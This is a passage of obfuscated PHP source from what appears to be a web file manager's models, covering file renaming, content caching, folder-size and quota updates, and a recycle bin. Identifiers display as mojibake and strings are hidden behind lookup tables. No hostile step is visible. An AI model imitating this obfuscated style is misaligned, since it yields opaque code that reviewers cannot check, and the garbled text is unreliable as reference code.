—‚ = array($—¡”ïß©); if ($¦ÇÆºæû) { $»ÊŸá—â = array_to_keyvalue($¦ÇÆºæû, $À²ÕØş‚[12], $À²ÕØş‚[458]); $»ÊŸá—â = array_remove_value($»ÊŸá—â, $À²ÕØş‚[190]); $˜õ© —‚ = array_to_keyvalue($¦ÇÆºæû, $À²ÕØş‚[12], $À²ÕØş‚[394]); $˜õ© —‚[] = $—¡”ïß©; } } else { $»ÊŸá—â = array($úôæ¢½[$À²ÕØş‚[458]]); $˜õ© —‚ = array($—¡”ïß©); } return array($À²ÕØş‚[2091] => $˜õ© —‚, $À²ÕØş‚[1452] => $»ÊŸá—â); } public function removeArray($ÙÉŸ»éí) { if (!$ÙÉŸ»éí) { return !0; } } public function removeRelevance($œïÊ”îı, $‚‘…¥ÑÍ) { $¦Æ¬ÀğÙ =& $_SERVER[® ¨Ä®ñ]; $œïÊ”îı = $œïÊ”îı ? $œïÊ”îı : array(); $‚‘…¥ÑÍ = $‚‘…¥ÑÍ ? $‚‘…¥ÑÍ : array(); $œïÊ”îı = array_unique(array_filter($œïÊ”îı)); $‚‘…¥ÑÍ = array_unique(array_filter($‚‘…¥ÑÍ)); if (!$œïÊ”îı) { return !1; } $ö™’ÖÁ’ = array($¦Æ¬ÀğÙ[409] => array($¦Æ¬ÀğÙ[410], $œïÊ”îı)); Model($¦Æ¬ÀğÙ[2092])->where($ö™’ÖÁ’)->delete(); Model($¦Æ¬ÀğÙ[452])->where($ö™’ÖÁ’)->delete(); Model($¦Æ¬ÀğÙ[1948])->where($ö™’ÖÁ’)->delete(); Model($¦Æ¬ÀğÙ[555])->where($ö™’ÖÁ’)->delete(); Model($¦Æ¬ÀğÙ[1787])->removeBySource($œïÊ”îı); Model($¦Æ¬ÀğÙ[2073])->removeBySource($œïÊ”îı); $this->where($ö™’ÖÁ’)->delete(); Model($¦Æ¬ÀğÙ[461])->remove($‚‘…¥ÑÍ); for ($¥†ñÅå = 0; $¥†ñÅå < count($œïÊ”îı); $¥†ñÅå++) { $this->sourceCacheClear($œïÊ”îı[$¥†ñÅå]); } } public function rename($ì¥¾ğ„, $ì’—Û’) { $õ¸ğòÍ’ =& $_SERVER[® ¨Ä®ñ]; $şÖ‡à¹ô = $this->sourceInfo($ì¥¾ğ„); if (!$şÖ‡à¹ô) { return !1; } $ìñòÍÎğ = $this->fileNameExist($şÖ‡à¹ô[$õ¸ğòÍ’[489]], $ì’—Û’); if ($ìñòÍÎğ && $ìñòÍÎğ != $ì¥¾ğ„) { return !1; } $û“²è“ú = array($õ¸ğòÍ’[412] => $ì’—Û’, $õ¸ğòÍ’[574] => USER_ID); if ($şÖ‡à¹ô[$õ¸ğòÍ’[402]] != $õ¸ğòÍ’[89]) { $û“²è“ú[$õ¸ğòÍ’[404]] = substr(get_path_ext($ì’—Û’), 0, 10); } Model($õ¸ğòÍ’[555])->eventRename($ì¥¾ğ„, $şÖ‡à¹ô[$õ¸ğòÍ’[32]], $ì’—Û’); $this->sourceCacheClear($ì¥¾ğ„); $this->setNamePinyin($ì¥¾ğ„, $û“²è“ú[$õ¸ğòÍ’[32]], !1); $this->updateModifyTime($şÖ‡à¹ô[$õ¸ğòÍ’[489]]); $²Éı†é¨ = $this->where(array($õ¸ğòÍ’[409] => $ì¥¾ğ„))->data($û“²è“ú)->save(); $Éîî™é± = $õ¸ğòÍ’[2081] . $şÖ‡à¹ô[$õ¸ğòÍ’[489]]; if (isset(self::$cacheChildList[$Éîî™é±])) { unset(self::$cacheChildList[$Éîî™é±]); } return $²Éı†é¨; } public function setNamePinyin($™”õ‚Øï, $Õç´½µ, $ª—°ßµÙ = true) { $‹Ì–ÓÎ‰ =& $_SERVER[® ¨Ä®ñ]; $ ÷öÁ·œ = Input::check($Õç´½µ, $‹Ì–ÓÎ‰[578]); $ è˜ÖÜì = array($‹Ì–ÓÎ‰[433] => KodSort::makeStr($Õç´½µ)); if ($ ÷öÁ·œ) { $ è˜ÖÜì[$‹Ì–ÓÎ‰[455]] = str_replace($‹Ì–ÓÎ‰[53], $‹Ì–ÓÎ‰[12], Pinyin::get($Õç´½µ)); $ è˜ÖÜì[$‹Ì–ÓÎ‰[454]] = Pinyin::get($Õç´½µ, $‹Ì–ÓÎ‰[579]); } if (!$ª—°ßµÙ && !$ ÷öÁ·œ) { $ è˜ÖÜì[$‹Ì–ÓÎ‰[455]] = null; $ è˜ÖÜì[$‹Ì–ÓÎ‰[454]] = null; } $this->metaSet($™”õ‚Øï, $ è˜ÖÜì); } public function getContent($¦å„‰Ğ’) { $Ø ‡ÈØ­ =& $_SERVER[® ¨Ä®ñ]; $öçîü»ˆ = $this->fileInfoGet($¦å„‰Ğ’); if (!$öçîü»ˆ) { return !1; } if ($öçîü»ˆ[$Ø ‡ÈØ­[80]] == 0) { return $Ø ‡ÈØ­[12]; } $ÔşÉ“ = $Ø ‡ÈØ­[2095] . $öçîü»ˆ[$Ø ‡ÈØ­[169]]; if ($öçîü»ˆ[$Ø ‡ÈØ­[80]] <= 1024 * 10) { $îÅŠÄ = Cache::get($ÔşÉ“); if (!$îÅŠÄ) { $îÅŠÄ = IO::getContent($öçîü»ˆ[$Ø ‡ÈØ­[78]]); Cache::set($ÔşÉ“, $îÅŠÄ); } return $îÅŠÄ; } if (!$öçîü»ˆ[$Ø ‡ÈØ­[78]]) { return $Ø ‡ÈØ­[12]; } return IO::getContent($öçîü»ˆ[$Ø ‡ÈØ­[78]]); } public function setDesc($×Åºèíß, $—•ƒ‰¿) { $¿õ£…é„ =& $_SERVER[® ¨Ä®ñ]; Model($¿õ£…é„[555])->eventAddDesc($×Åºèíß, $—•ƒ‰¿); return $this->metaSet($×Åºèíß, $¿õ£…é„[442], $—•ƒ‰¿); } public function setContent($æŒ­”½, $İ°ƒ×ş = '') { $ê¢’¨—Ü =& $_SERVER[® ¨Ä®ñ]; $ÒËª°¶é = $this->sourceInfo($æŒ­”½); $’ô´èëà = $this->fileInfoGet($æŒ­”½); if (!$’ô´èëà || !$ÒËª°¶é) { return !1; } $ú·ÜüÑæ = Model($ê¢’¨—Ü[461])->addFileByContent($İ°ƒ×ş, $ÒËª°¶é[$ê¢’¨—Ü[32]]); $›îò¶ö÷ = $this->fileHistory($ÒËª°¶é, $ú·ÜüÑæ[$ê¢’¨—Ü[458]], $ú·ÜüÑæ[$ê¢’¨—Ü[80]]); if (!$›îò¶ö÷) { return Model($ê¢’¨—Ü[461])->remove($ú·ÜüÑæ[$ê¢’¨—Ü[458]]); } $this->folderSizeReset($ÒËª°¶é[$ê¢’¨—Ü[489]]); return !0; } public function fileSubstr($ªÙÑò°†, $ÛœİåÚÎ, $¿ğ›ûŞØ) { $êÚĞù¨÷ = $this->fileInfoGet($ªÙÑò°†); if (!$êÚĞù¨÷) { return !1; } return IO::fileSubstr($êÚĞù¨÷[$_SERVER[® ¨Ä®ñ][78]], $ÛœİåÚÎ, $¿ğ›ûŞØ); } public function fileInfoGet($ç§áÖöÒ) { $ƒ˜“úØ€ =& $_SERVER[® ¨Ä®ñ]; $««Ã²™œ = $this->sourceInfo($ç§áÖöÒ); if (!$««Ã²™œ || $««Ã²™œ[$ƒ˜“úØ€[402]]) { return !1; } $µº™ÕÕ = $ƒ˜“úØ€[464] . $««Ã²™œ[$ƒ˜“úØ€[458]]; $Í–ûÒµ = _get(self::$cacheFileInfo, $µº™ÕÕ); if ($Í–ûÒµ) { return $Í–ûÒµ; } $ä½Œç´ = Model($ƒ˜“úØ€[461])->fileInfo($««Ã²™œ[$ƒ˜“úØ€[458]]); if ($ä½Œç´) { $ä½Œç´[$ƒ˜“úØ€[32]] = $««Ã²™œ[$ƒ˜“úØ€[32]]; } self::$cacheFileInfo[$µº™ÕÕ] = $ä½Œç´; return $ä½Œç´; } private function folderChildrenNumber($¡ª´í™Ä) { $øƒÕ—É =& $_SERVER[® ¨Ä®ñ]; $˜¶½—Î = $this->sourceInfo($¡ª´í™Ä); $æÂ¥†Åõ = array($øƒÕ—É[575] => array($øƒÕ—É[535], $˜¶½—Î[$øƒÕ—É[512]] . $¡ª´í™Ä . $øƒÕ—É[536]), $øƒÕ—É[572] => $˜¶½—Î[$øƒÕ—É[495]], $øƒÕ—É[421] => intval($˜¶½—Î[$øƒÕ—É[422]]), $øƒÕ—É[568] => 1); $Çëğ†ˆİ = $this->where($æÂ¥†Åõ)->count(); $´öõ…ÕË = $this->where($æÂ¥†Åõ)->where(array($øƒÕ—É[568] => 0))->count(); return array($øƒÕ—É[84] => $´öõ…ÕË, $øƒÕ—É[85] => $Çëğ†ˆİ); } public function pathInfo($çÆ£Ëñ, $ã„›êÈ™ = false) { $ü•Ô‡ç =& $_SERVER[® ¨Ä®ñ]; $ã„›êÈ™ = !1; $çÆ£Ëñ = intval($çÆ£Ëñ); $íÜæï¬Ó = $ü•Ô‡ç[450] . intval($ã„›êÈ™) . $ü•Ô‡ç[451] . $çÆ£Ëñ; $¼ãìÄÛ“ = _get(self::$cachePathInfo, $íÜæï¬Ó); if ($¼ãìÄÛ“) { return $¼ãìÄÛ“; } $”½¬¿Àı = $this->sourceInfo($çÆ£Ëñ); if (!$”½¬¿Àı) { return !1; } $”½¬¿Àı = $this->_listDataApplyItem($”½¬¿Àı, $ã„›êÈ™); self::$cachePathInfo[$íÜæï¬Ó] = $”½¬¿Àı; return $”½¬¿Àı; } public static $cachePathInfoMore = array(); public function pathInfoMore($¾Ó«Èæç) { $çÄÇ§ï„ =& $_SERVER[® ¨Ä®ñ]; $¶ÂûáÜ = _get(self::$cachePathInfoMore, $¾Ó«Èæç); if ($¶ÂûáÜ) { return $¶ÂûáÜ; } $×Š§ôÄÅ = $this->pathInfo($¾Ó«Èæç); if (!$×Š§ôÄÅ) { return !1; } if ($×Š§ôÄÅ[$çÄÇ§ï„[402]] == $çÄÇ§ï„[89]) { $×Š§ôÄÅ[$çÄÇ§ï„[83]] = $this->folderChildrenNumber($¾Ó«Èæç); } self::$cachePathInfoMore[$¾Ó«Èæç] = $×Š§ôÄÅ; return $×Š§ôÄÅ; } public function sourceInfo($À†’ö×ï) { $„£†–­® =& $_SERVER[® ¨Ä®ñ]; if (!$À†’ö×ï) { return array(); } $À†’ö×ï = intval($À†’ö×ï); $©ÜŸòåå = $„£†–­®[449] . $À†’ö×ï; $Ñú…‹ƒ½ = _get(self::$cacheSourceInfo, $©ÜŸòåå); if ($Ñú…‹ƒ½) { return $Ñú…‹ƒ½; } $¯ä°åö— = $this->where(array($„£†–­®[394] => $À†’ö×ï))->find(); self::$cacheSourceInfo[$©ÜŸòåå] = $¯ä°åö—; return self::$cacheSourceInfo[$©ÜŸòåå]; } public function sourceCacheClear($‰˜ßì¿™ = false) { self::cacheClear($‰˜ßì¿™); } public static function cacheClear($ÕÒ˜¶™ó = false) { $îúß¤²× =& $_SERVER[® ¨Ä®ñ]; if ($ÕÒ˜¶™ó == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$îúß¤²×[449] . $ÕÒ˜¶™ó]); unset(self::$cachePathInfoMore[$ÕÒ˜¶™ó]); unset(self::$cachePathInfo[$îúß¤²×[2096] . $ÕÒ˜¶™ó]); unset(self::$cachePathInfo[$îúß¤²×[2097] . $ÕÒ˜¶™ó]); } public function metaSet($ çŠƒìš, $ßÛ…§… = null, $­¸ÖäØ = null) { $Á©éº = parent::metaSet($ çŠƒìš, $ßÛ…§…, $­¸ÖäØ); if ($Á©éº) { $this->sourceCacheClear($ çŠƒìš); } return $Á©éº; } public function pathInfoByPath($ÆÊÜôï‡, $Ò½´óôæ) { $•¸å»°§ =& $_SERVER[® ¨Ä®ñ]; $’ØÏÈı— = !$Ò½´óôæ ? array() : explode($•¸å»°§[8], trim($Ò½´óôæ, $•¸å»°§[8])); $ÚÛáÁã = $ÆÊÜôï‡; foreach ($’ØÏÈı— as $‹†ƒ×Ü¢) { $Ò³Œ±ĞÚ = array($•¸å»°§[489] => $ÚÛáÁã, $•¸å»°§[32] => $‹†ƒ×Ü¢); $ìÃÜ„õú = $this->where($Ò³Œ±ĞÚ)->select(); if (!$ìÃÜ„õú) { return !1; } $ìÃÜ„õú = array_sort_by($ìÃÜ„õú, $•¸å»°§[422]); $ÚÛáÁã = $ìÃÜ„õú[0][$•¸å»°§[394]]; } return $this->pathInfo($ÚÛáÁã, !0); } protected function updateModifyTime($”ìÛş•Û) { $Š—™§°Ü =& $_SERVER[® ¨Ä®ñ]; $âÈ°Ãœñ = defined($Š—™§°Ü[465]) ? USER_ID : $Š—™§°Ü[190]; if (!$”ìÛş•Û) { return; } if (!is_array($”ìÛş•Û)) { $”ìÛş•Û = array($”ìÛş•Û); } foreach ($”ìÛş•Û as $úÅ“•ŸŒ => $ÜÇŠÇ‹½) { $”ìÛş•Û[$úÅ“•ŸŒ] = intval($ÜÇŠÇ‹½); $this->sourceCacheClear($ÜÇŠÇ‹½); } $—÷Å „ = array($Š—™§°Ü[394] => array($Š—™§°Ü[7], $”ìÛş•Û)); $ÍæŸ€¸ = array($Š—™§°Ü[574] => $âÈ°Ãœñ, $Š—™§°Ü[416] => time()); $this->where($—÷Å „)->save($ÍæŸ€¸); } public function folderSizeReset($Î£æ¶, $³‘Ë€› = false) { $»á¿õÙÂ =& $_SERVER[® ¨Ä®ñ]; if ($this->statusIgnoreResetSpace) { return; } $–É¶åä = $this->sourceInfo($Î£æ¶); $…ËŒş¬ä = $»á¿õÙÂ[2098] . $Î£æ¶; CacheLock::lock($…ËŒş¬ä, 20); if ($³‘Ë€› === !1) { $this->sourceCacheClear($Î£æ¶); $–É¶åä = $this->sourceInfo($Î£æ¶); $Êê•»ËÅ = array($»á¿õÙÂ[393] => $Î£æ¶, $»á¿õÙÂ[421] => 0); $ö†òØÙÖ = $this->where($Êê•»ËÅ)->sum($»á¿õÙÂ[80]); $³‘Ë€› = intval($ö†òØÙÖ) - intval($–É¶åä[$»á¿õÙÂ[80]]); } if ($³‘Ë€› == 0) { return CacheLock::unlock($…ËŒş¬ä); } $î„ÀÒ¾» = $this->parentLevelArray($–É¶åä[$»á¿õÙÂ[512]]); if (!$î„ÀÒ¾») { $î„ÀÒ¾» = array(); } $î„ÀÒ¾»[] = $–É¶åä[$»á¿õÙÂ[394]]; $Êê•»ËÅ = array($»á¿õÙÂ[394] => array($»á¿õÙÂ[410], $î„ÀÒ¾»)); if ($³‘Ë€› < 0) { $Êê•»ËÅ[$»á¿õÙÂ[80]] = array($»á¿õÙÂ[999], abs($³‘Ë€›)); } $this->where($Êê•»ËÅ)->setAdd($»á¿õÙÂ[80], $³‘Ë€›); CacheLock::unlock($…ËŒş¬ä); $âƒšÒæ = $»á¿õÙÂ[2099] . $–É¶åä[$»á¿õÙÂ[403]] . $»á¿õÙÂ[4] . $–É¶åä[$»á¿õÙÂ[495]]; $ÙÊµÊ¢¢ = array($–É¶åä[$»á¿õÙÂ[403]], $–É¶åä[$»á¿õÙÂ[495]]); TaskRun::timeLimitCall($âƒšÒæ, $»á¿õÙÂ[2100], $ÙÊµÊ¢¢, 1.5); } public function folderSizeResetChildren($”àéËˆâ) { $ĞÑ¤åÒ• =& $_SERVER[® ¨Ä®ñ]; $this->sourceCacheClear($”àéËˆâ); $ÒĞ™€Œ½ = $this->sourceInfo($”àéËˆâ); $Ã°éùÁÚ = array($ĞÑ¤åÒ•[568] => 1, $ĞÑ¤åÒ•[572] => $ÒĞ™€Œ½[$ĞÑ¤åÒ•[495]], $ĞÑ¤åÒ•[575] => array($ĞÑ¤åÒ•[535], $ÒĞ™€Œ½[$ĞÑ¤åÒ•[512]] . $”àéËˆâ . $ĞÑ¤åÒ•[536])); $ªÅ‰ëÏ‹ = $ĞÑ¤åÒ•[2101]; $‰ºÚÏŞ­ = $this->field($ªÅ‰ëÏ‹)->where($Ã°éùÁÚ)->select(); $Ã°éùÁÚ[$ĞÑ¤åÒ•[402]] = 0; $‰¬œÓû = $this->field($ªÅ‰ëÏ‹)->where($Ã°éùÁÚ)->select(); if (!$‰¬œÓû) { return; } $‰ºÚÏŞ­[] = $ÒĞ™€Œ½; $‰ºÚÏŞ­ = array_to_keyvalue($‰ºÚÏŞ­, $ĞÑ¤åÒ•[394]); foreach ($‰ºÚÏŞ­ as $ÛËı˜Æµ => $ş¶öÔ) { $‰ºÚÏŞ­[$ÛËı˜Æµ][$ĞÑ¤åÒ•[2102]] = $‰ºÚÏŞ­[$ÛËı˜Æµ][$ĞÑ¤åÒ•[80]]; $‰ºÚÏŞ­[$ÛËı˜Æµ][$ĞÑ¤åÒ•[80]] = 0; } foreach ($‰¬œÓû as $ş¶öÔ) { $Ì¶¤îÊÉ = $ş¶öÔ[$ĞÑ¤åÒ•[489]] . $ĞÑ¤åÒ•[12]; if (!isset($‰ºÚÏŞ­[$Ì¶¤îÊÉ])) { continue; } if ($ş¶öÔ[$ĞÑ¤åÒ•[422]] == $‰ºÚÏŞ­[$Ì¶¤îÊÉ][$ĞÑ¤åÒ•[422]]) { $‰ºÚÏŞ­[$Ì¶¤îÊÉ][$ĞÑ¤åÒ•[80]] += $ş¶öÔ[$ĞÑ¤åÒ•[80]]; } } foreach ($‰ºÚÏŞ­ as $ş¶öÔ) { $”Ğô©ûô = $this->parentLevelArray($ş¶öÔ[$ĞÑ¤åÒ•[512]]); foreach ($”Ğô©ûô as $Ì¶¤îÊÉ) { $Ì¶¤îÊÉ = $Ì¶¤îÊÉ . $ĞÑ¤åÒ•[12]; if (!isset($‰ºÚÏŞ­[$Ì¶¤îÊÉ])) { continue; } if ($ş¶öÔ[$ĞÑ¤åÒ•[422]] == $‰ºÚÏŞ­[$Ì¶¤îÊÉ][$ĞÑ¤åÒ•[422]]) { $‰ºÚÏŞ­[$Ì¶¤îÊÉ][$ĞÑ¤åÒ•[80]] += $ş¶öÔ[$ĞÑ¤åÒ•[80]]; } } } $ŞßÏ¿î› = array(); foreach ($‰ºÚÏŞ­ as $ş¶öÔ) { if ($ş¶öÔ[$ĞÑ¤åÒ•[80]] == $ş¶öÔ[$ĞÑ¤åÒ•[2102]]) { continue; } $ŞßÏ¿î›[] = array($ĞÑ¤åÒ•[394], $ş¶öÔ[$ĞÑ¤åÒ•[394]], $ĞÑ¤åÒ•[80], $ş¶öÔ[$ĞÑ¤åÒ•[80]]); } $this->saveAll($ŞßÏ¿î›); } public function userSpaceReset($ØÁÕ™Ê = false) { $ˆçîİĞŒ =& $_SERVER[® ¨Ä®ñ]; $¢ˆ¦³ï = $this->where(array($ˆçîİĞŒ[403] => self::TYPE_USER, $ˆçîİĞŒ[495] => $ØÁÕ™Ê, $ˆçîİĞŒ[402] => 0))->sum($ˆçîİĞŒ[80]); $¢ˆ¦³ï = !$¢ˆ¦³ï || $¢ˆ¦³ï <= 0 ? 0 : $¢ˆ¦³ï; Model($ˆçîİĞŒ[504])->userEdit($ØÁÕ™Ê, array($ˆçîİĞŒ[1796] => $¢ˆ¦³ï)); } public function targetSpaceUpdate($ª¥©­ÄÁ, $‡œĞõøÕ) { $ûÍÜ»â =& $_SERVER[® ¨Ä®ñ]; if (!$‡œĞõøÕ) { return; } if (!in_array($ª¥©­ÄÁ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¢Æíìíá = $this->targetSpaceSize($ª¥©­ÄÁ, $‡œĞõøÕ); if ($ª¥©­ÄÁ == self::TYPE_USER) { Model($ûÍÜ»â[504])->userEdit($‡œĞõøÕ, array($ûÍÜ»â[1796] => $¢Æíìíá)); } else { if ($ª¥©­ÄÁ == self::TYPE_GROUP) { Model($ûÍÜ»â[513])->groupEdit($‡œĞõøÕ, array($ûÍÜ»â[1796] => $¢Æíìíá)); } } } public function targetSpaceSize($Ë¦Âò©À, $öÑ˜ï¥) { $ã²½›ßŸ =& $_SERVER[® ¨Ä®ñ]; $—û”Î£¸ = $this->sourceRoot($Ë¦Âò©À, $öÑ˜ï¥, !0); if (!$—û”Î£¸) { return 0; } $í´ŞãÏ“ = floatval($—û”Î£¸[$ã²½›ßŸ[80]]); $Áï°‰ = array($ã²½›ßŸ[575] => array($ã²½›ßŸ[535], $ã²½›ßŸ[522] . $—û”Î£¸[$ã²½›ßŸ[394]] . $ã²½›ßŸ[536])); $®¢Å®®‹ = Model($ã²½›ßŸ[420])->field($ã²½›ßŸ[409])->where($Áï°‰)->select(); $®¢Å®®‹ = array_to_keyvalue($®¢Å®®‹, $ã²½›ßŸ[12], $ã²½›ßŸ[394]); $®¢Å®®‹ = array_unique(array_filter($®¢Å®®‹)); if ($®¢Å®®‹) { $Áï°‰ = array($ã²½›ßŸ[409] => array($ã²½›ßŸ[410], $®¢Å®®‹)); $í´ŞãÏ“ += floatval($this->where($Áï°‰)->sum($ã²½›ßŸ[80])); } $í´ŞãÏ“ = !$í´ŞãÏ“ || $í´ŞãÏ“ <= 0 ? 0 : $í´ŞãÏ“; return $í´ŞãÏ“; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ç€Ù—Ñ) { return $this->fileTypeProfile($ç€Ù—Ñ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¸¯®ÉÀõ) { return $this->fileTypeProfile($¸¯®ÉÀõ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($…™„ÑÖù, $ĞÈ¡€ÉÍ) { $ŠïìÙÄš =& $_SERVER[® ¨Ä®ñ]; $¼›¤ú·Ö = $ŠïìÙÄš[2103] . $…™„ÑÖù . $ŠïìÙÄš[11] . $ĞÈ¡€ÉÍ; $§‘ğöÚŒ = Cache::get($¼›¤ú·Ö); if ($§‘ğöÚŒ) { return $§‘ğöÚŒ; } $†µÕãóÃ = array($ŠïìÙÄš[568] => 0); if ($…™„ÑÖù != !1) { $†µÕãóÃ[$ŠïìÙÄš[495]] = $…™„ÑÖù; $†µÕãóÃ[$ŠïìÙÄš[403]] = $ĞÈ¡€ÉÍ; } $”í­è¢¡ = array(); $”í­è¢¡[$ŠïìÙÄš[2104]] = array($ŠïìÙÄš[2105] => LNG($ŠïìÙÄš[2104]), $ŠïìÙÄš[2106] => $this->where($†µÕãóÃ)->count(), $ŠïìÙÄš[570] => $this->where($†µÕãóÃ)->sum($ŠïìÙÄš[80])); $é¡ÈÀ Ê = KodIO::fileTypeList(); foreach ($é¡ÈÀ Ê as $¥àçíŒ => $÷ìÀõø) { $†µÕãóÃ[$ŠïìÙÄš[404]] = $this->fileTypeWhere($¥àçíŒ); $”í­è¢¡[$¥àçíŒ] = array($ŠïìÙÄš[2105] => $÷ìÀõø[$ŠïìÙÄš[32]], $ŠïìÙÄš[2106] => $this->where($†µÕãóÃ)->count(), $ŠïìÙÄš[570] => $this->where($†µÕãóÃ)->sum($ŠïìÙÄš[80])); } Cache::set($¼›¤ú·Ö, $”í­è¢¡, 1200); return $”í­è¢¡; } public function fileNameExist($œ“õ±ã, $‡†¢îÜ) { $ËòÙû¨ê =& $_SERVER[® ¨Ä®ñ]; $Şõ””ôÅ = $this->where(array($ËòÙû¨ê[489] => $œ“õ±ã, $ËòÙû¨ê[32] => $‡†¢îÜ, $ËòÙû¨ê[422] => 0))->find(); return is_array($Şõ””ôÅ) ? $Şõ””ôÅ[$ËòÙû¨ê[394]] : !1; } public function childList($ù¢äş’¾) { $Ğùæëçù =& $_SERVER[® ¨Ä®ñ]; $ÀÎ¦Ì Ş = $Ğùæëçù[2081] . $ù¢äş’¾; if (isset(self::$cacheChildList[$ÀÎ¦Ì Ş])) { return self::$cacheChildList[$ÀÎ¦Ì Ş]; } $É¤·÷¢¥ = array($Ğùæëçù[489] => intval($ù¢äş’¾), $Ğùæëçù[422] => 0); $Å©‘¯°† = $this->where($É¤·÷¢¥)->select(); $Å©‘¯°† = $Å©‘¯°† ? $Å©‘¯°† : array(); self::$cacheChildList[$ÀÎ¦Ì Ş] = $Å©‘¯°†; foreach ($Å©‘¯°† as $õÏ³™â„) { $ÀÎ¦Ì Ş = $Ğùæëçù[449] . $õÏ³™â„[$Ğùæëçù[394]]; self::$cacheSourceInfo[$ÀÎ¦Ì Ş] = $õÏ³™â„; } return $Å©‘¯°†; } public function fileNameAuto($¯Óüä³¬, $ûµß´»˜, $Ì€ú¯úü = REPEAT_RENAME, $üüÔ‘¶® = false) { $õÇ”ã =& $_SERVER[® ¨Ä®ñ]; $üœÈ³Ü = array($õÇ”ã[489] => $¯Óüä³¬, $õÇ”ã[422] => 0, $õÇ”ã[32] => array($õÇ”ã[378], $ûµß´»˜ . $õÇ”ã[379])); $«•¶˜ûñ = $this->field($õÇ”ã[32])->where($üœÈ³Ü)->select(); $Î»µÈ  = array_to_keyvalue($«•¶˜ûñ, $õÇ”ã[12], $õÇ”ã[32]); return $this->fileNameAutoGet($Î»µÈ , $ûµß´»˜, $Ì€ú¯úü, $üüÔ‘¶®); } public function fileNameAutoGet($Š“ôó—˜, $“ÅÕê×Ş, $‚”ø¸æ, $Æ©Ù§) { $ÙÆÔÚ¿Ö =& $_SERVER[® ¨Ä®ñ]; if ($‚”ø¸æ == REPEAT_REPLACE || !$Š“ôó—˜ || !in_array_not_case($“ÅÕê×Ş, $Š“ôó—˜) || $Æ©Ù§ && $‚”ø¸æ != REPEAT_RENAME_FOLDER) { return $“ÅÕê×Ş; } if ($‚”ø¸æ == REPEAT_SKIP) { return !1; } $á¬Ğ‘ô· = $ÙÆÔÚ¿Ö[10] . get_path_ext($“ÅÕê×Ş); $á¬Ğ‘ô· = $á¬Ğ‘ô· == $ÙÆÔÚ¿Ö[10] || $Æ©Ù§ ? $ÙÆÔÚ¿Ö[12] : $á¬Ğ‘ô·; for ($ÉâÕ€ŠÂ = 1; $ÉâÕ€ŠÂ <= count($Š“ôó—˜) + 1; $ÉâÕ€ŠÂ++) { $ËØüÅ×¾ = substr($“ÅÕê×Ş, 0, strlen($“ÅÕê×Ş) - strlen($á¬Ğ‘ô·)); $÷Ğ¹øÍ = $ËØüÅ×¾ . "\50{$ÉâÕ€ŠÂ}\51{$á¬Ğ‘ô·}"; if (!in_array_not_case($÷Ğ¹øÍ, $Š“ôó—˜)) { return $÷Ğ¹øÍ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\x72\x63\145\x5f\162\x65\143\x79\x63\154\145"; protected $dataAuto = array(array("\143\x72\145\x61\x74\x65\124\151\155\x65", "\x74\151\155\x65", "\151\156\163\145\162\x74", "\x66\165\x6e\143\164\151\x6f\x6e")); public function listData($£©“éñ = false) { $ƒ’¸¯ÓŠ =& $_SERVER[® ¨Ä®ñ]; $£©“éñ = $£©“éñ ? $£©“éñ : USER_ID; $ô°²üª† = $this->where(array($ƒ’¸¯ÓŠ[1630] => $£©“éñ))->select(); return array_to_keyvalue($ô°²üª†, $ƒ’¸¯ÓŠ[12], $ƒ’¸¯ÓŠ[394]); } public function moveToRecycle($áµ÷µ¹¨) { $Öùß¶”Ş =& $_SERVER[® ¨Ä®ñ]; $ËÖûÛ¤ƒ = Model($Öùß¶”Ş[1309]); $Û—Ùá› = $ËÖûÛ¤ƒ->sourceInfo($áµ÷µ¹¨); if (!$Û—Ùá› || $Û—Ùá›[$Öùß¶”Ş[422]] == $Öùß¶”Ş[89]) { return; } $™±Ú½Ú = array($Öùß¶”Ş[409] => $áµ÷µ¹¨, $Öùß¶”Ş[1630] => USER_ID, $Öùß¶”Ş[571] => $Û—Ùá›[$Öùß¶”Ş[403]], $Öùß¶”Ş[572] => $Û—Ùá›[$Öùß¶”Ş[495]], $Öùß¶”Ş[575] => $Û—Ùá›[$Öùß¶”Ş[512]]); $this->add($™±Ú½Ú); $this->recycleMove($áµ÷µ¹¨, 1); if ($Û—Ùá›[$Öùß¶”Ş[402]] == $Öùß¶”Ş[89]) { $šõ™†–Ä = array($Öùß¶”Ş[575] => array($Öùß¶”Ş[535], $Û—Ùá›[$Öùß¶”Ş[512]] . $áµ÷µ¹¨ . $Öùß¶”Ş[536])); $ËÖûÛ¤ƒ->where($šõ™†–Ä)->setField($Öùß¶”Ş[422], 1); } } public function clear() { $this->remove(!1); } public function remove($Àö³¤¬Ç = false, $ûú ·Øê = false) { $Ó¾şŸÄë =& $_SERVER[® ¨Ä®ñ]; $ûú ·Øê = $ûú ·Øê ? $ûú ·Øê : USER_ID; $£¡ˆØ¦ = Model($Ó¾şŸÄë[1309]); $÷Î÷œ¦õ = $this->listData($ûú ·Øê); $Àö³¤¬Ç = $Àö³¤¬Ç === !1 ? !1 : $Àö³¤¬Ç; $„¿úçÃ³ = array(); foreach ($÷Î÷œ¦õ as $ÎØúÒÊ) { if ($Àö³¤¬Ç != !1 && !in_array($ÎØúÒÊ, $Àö³¤¬Ç)) { continue; } $¼û™¦õ¹ = $£¡ˆØ¦->sourceInfo($ÎØúÒÊ); $£¡ˆØ¦->remove($ÎØúÒÊ, !1); $şƒœÒùÑ = $¼û™¦õ¹[$Ó¾şŸÄë[403]] . $Ó¾şŸÄë[11] . $¼û™¦õ¹[$Ó¾şŸÄë[495]]; $„¿úçÃ³[$şƒœÒùÑ] = array($Ó¾şŸÄë[571] => $¼û™¦õ¹[$Ó¾şŸÄë[403]], $Ó¾şŸÄë[495] => $¼û™¦õ¹[$Ó¾şŸÄë[495]]); $this->where(array($Ó¾şŸÄë[394] => $ÎØúÒÊ))->delete(); } foreach ($„¿úçÃ³ as $½Şëë’) { $£¡ˆØ¦->targetSpaceUpdate($½Şëë’[$Ó¾şŸÄë[403]], $½Şëë’[$Ó¾şŸÄë[495]]); } } public function restore($¬ş±“£¬ = false) { $Äƒ‡‘ÕÉ = $this->listData(); $this->_restoreSource($Äƒ‡‘ÕÉ, $¬ş±“£¬); } public function 